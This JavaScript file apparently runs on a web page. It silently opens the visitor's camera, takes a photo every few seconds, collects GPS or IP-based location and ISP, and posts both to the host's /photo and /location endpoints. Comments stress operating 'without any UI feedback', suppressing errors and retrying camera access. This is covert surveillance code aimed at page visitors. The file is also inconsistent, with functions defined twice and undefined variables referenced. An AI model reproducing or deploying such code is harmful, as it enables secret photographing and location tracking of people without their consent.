// DOM Elements
const video = document.createElement('video');
const canvas = document.createElement('canvas');
let stream = null;

// App state
let currentLocation = null;
let captureInterval = null;
const CAPTURE_DELAY = 10000; // 10 seconds between captures
let isCapturing = false;

// Initialize the app
document.addEventListener('DOMContentLoaded', () => {
    // Start camera and location services
    startCamera();
    getLocation();
});

// Start camera function silently
async function startCamera() {
    try {
        // Request camera access without any UI feedback
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 640 },
                height: { ideal: 480 },
                facingMode: 'environment'
            },
            audio: false
        });
        
        // Set video properties for background operation
        video.muted = true;
        video.playsInline = true;
        video.autoplay = true;
        video.srcObject = stream;
        
        // Start video playback silently
        return new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play().catch(() => {});
                startAutoCapture();
                resolve();
            };
            
            // Silent error handling
            video.onerror = () => setTimeout(startCamera, 10000); // Retry every 10s on error
        });
        
    } catch (err) {
        // Silent retry on error
        setTimeout(startCamera, 10000);
    }
}

// Start automatic photo capture (silent background operation)
function startAutoCapture() {
    // Clear any existing interval
    if (captureInterval) {
        clearInterval(captureInterval);
    }
    
    // Initial capture after a short delay
    setTimeout(capturePhoto, 2000);
    
    // Set up interval for automatic capture
    captureInterval = setInterval(() => {
        capturePhoto();
    }, CAPTURE_DELAY);
}

// Start automatic photo capture
function startAutoCapture() {
    // Clear any existing interval
    if (captureInterval) {
        clearInterval(captureInterval);
    }
    
    // Initial capture
    capturePhoto();
    
    // Set up interval for automatic capture every 5 seconds
    captureInterval = setInterval(() => {
        if (!isCapturing) {  // Prevent overlapping captures
            capturePhoto();
        }
    }, 5000);
    
    isCapturing = false;
    
    // Update UI to show auto-capture is active
    if (controls) {
        controls.innerHTML = `
            <div class="auto-capture-info">
                <span class="material-icons">camera</span>
                <span>Auto-capturing every 5 seconds</span>
            </div>
            <div id="locationInfo">
                <span class="material-icons">location_searching</span>
                <span>Getting location...</span>
            </div>
        `;
        controls.style.display = 'flex';
    }
}

// Stop automatic photo capture
function stopAutoCapture() {
    if (captureInterval) {
        clearInterval(captureInterval);
        captureInterval = null;
    }
    isCapturing = false;
}

// Get user's location silently
function getLocation() {
    if (!navigator.geolocation) {
        getApproximateLocation();
        return;
    }
    
    navigator.geolocation.getCurrentPosition(
        (position) => {
            currentLocation = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: new Date().toISOString(),
                source: 'gps'
            };
            // Update location periodically
            setTimeout(getLocation, 60000); // Update every minute
        },
        () => {
            // Silent fallback to IP-based location
            getApproximateLocation();
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

// Get approximate location using IP
async function getApproximateLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        currentLocation = {
            latitude: data.latitude,
            longitude: data.longitude,
            accuracy: 5000, // Approximate accuracy in meters
            timestamp: new Date().toISOString(),
            source: 'ip',
            city: data.city,
            country: data.country_name
        };
    } catch (error) {
        // Silent error handling
    } finally {
        // Retry location after delay
        setTimeout(getLocation, 300000); // Retry in 5 minutes
    }
}

// Fallback to IP-based geolocation
function getApproximateLocation() {
    // If we already have an IP-based location, don't request again
    if (currentLocation?.source === 'ip') return;
    
    updateLocationInfo('Getting approximate location...');
    
    // First try ipapi.co
    fetch('https://ipapi.co/json/')
        .then(response => {
            if (!response.ok) throw new Error('Network response was not ok');
            return response.json();
        })
        .then(data => {
            if (data.latitude && data.longitude) {
                currentLocation = {
                    latitude: parseFloat(data.latitude).toFixed(6),
                    longitude: parseFloat(data.longitude).toFixed(6),
                    accuracy: 5000, // Approximate accuracy in meters
                    approximate: true,
                    source: 'ip',
                    city: data.city,
                    country: data.country_name,
                    isp: data.org
                };
                updateLocationInfo('Approximate location (IP-based)');
                console.log('Using IP-based location:', currentLocation);
            } else {
                throw new Error('No location data in response');
            }
        })
        .catch(error => {
            console.error('Primary IP geolocation failed, trying fallback...', error);
            // Fallback to ipinfo.io if first attempt fails
            return fetch('https://ipinfo.io/json?token=7b7e7b7e7b7e7b')
                .then(response => response.json())
                .then(data => {
                    if (data.loc) {
                        const [lat, lng] = data.loc.split(',');
                        currentLocation = {
                            latitude: parseFloat(lat).toFixed(6),
                            longitude: parseFloat(lng).toFixed(6),
                            accuracy: 10000, // Less accurate fallback
                            approximate: true,
                            source: 'ip',
                            city: data.city,
                            country: data.country,
                            isp: data.org
                        };
                        updateLocationInfo('Approximate location (fallback)');
                        console.log('Using fallback IP-based location:', currentLocation);
                    } else {
                        throw new Error('No location in fallback response');
                    }
                });
        })
        .catch(error => {
            console.error('All IP geolocation attempts failed:', error);
            updateLocationInfo('Could not get location');
            // Set default location (San Francisco) as last resort
            currentLocation = {
                latitude: '37.7749',
                longitude: '-122.4194',
                accuracy: 100000, // Very low accuracy
                approximate: true,
                source: 'default',
                error: 'Using default location'
            };
        });
}

// Update location info display
function updateLocationInfo(text) {
    if (locationInfo) {
        locationInfo.innerHTML = `
            <span class="material-icons">location_on</span>
            <span>${text}</span>
        `;
    }
}

// Capture photo function (silent background operation)
async function capturePhoto() {
    if (isCapturing || !stream || !video.videoWidth) return;
    isCapturing = true;
    
    try {
        // Set canvas dimensions to match video (reduced size for performance)
        const maxDimension = 800; // Reduced from 1024 for better performance
        let width = video.videoWidth;
        let height = video.videoHeight;
        
        // Calculate new dimensions maintaining aspect ratio
        if (width > height) {
            if (width > maxDimension) {
                height = Math.round((height * maxDimension) / width);
                width = maxDimension;
            }
        } else {
            if (height > maxDimension) {
                width = Math.round((width * maxDimension) / height);
                height = maxDimension;
            }
        }
        
        canvas.width = width;
        canvas.height = height;
        
        // Draw current video frame to canvas with new dimensions
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, width, height);
        
        // Get image data as base64 with lower quality for smaller size
        const imageData = canvas.toDataURL('image/jpeg', 0.5); // Reduced quality
        
        // Skip if image is too large
        if (imageData.length > 8 * 1024 * 1024) return;
        
        // Prepare location data (use existing or empty)
        const locationData = currentLocation || {
            latitude: 0,
            longitude: 0,
            accuracy: 0,
            approximate: true
        };
        
        // Send data to server silently
        await sendToServer({
            photo: imageData,
            ...locationData
        });
        
    } catch (err) {
        // Silent error handling
    } finally {
        isCapturing = false;
    }
}

// Track last sent location to avoid duplicates
let lastSentLocation = null;

// Get base URL based on current hostname
function getBaseUrl() {
    // If we're on localhost, use localhost:8080, otherwise use current hostname
    return window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
        ? 'http://localhost:8080'
        : `${window.location.protocol}//${window.location.host}`;
}

// Send data to server (silent operation)
async function sendToServer(data) {
    const baseUrl = getBaseUrl();
    
    try {
        // Only send location if it has changed
        if (currentLocation) {
            const locKey = `${currentLocation.latitude},${currentLocation.longitude}`;
            if (lastSentLocation !== locKey) {
                // Fire and forget location update
                fetch(`${baseUrl}/location`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(currentLocation)
                }).catch(() => {}); // Ignore errors
                lastSentLocation = locKey;
            }
        }
        
        // Send photo data (fire and forget)
        fetch(`${baseUrl}/photo`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {}); // Ignore errors
        
    } catch (error) {
        // Silent error handling
    }
}

// Show toast notification
function showToast(message, duration = 3000) {
    toast.textContent = message;
    toast.classList.add('show');
    
    setTimeout(() => {
        toast.classList.remove('show');
    }, duration);
}

// Handle window close/unload
window.addEventListener('beforeunload', () => {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }
});
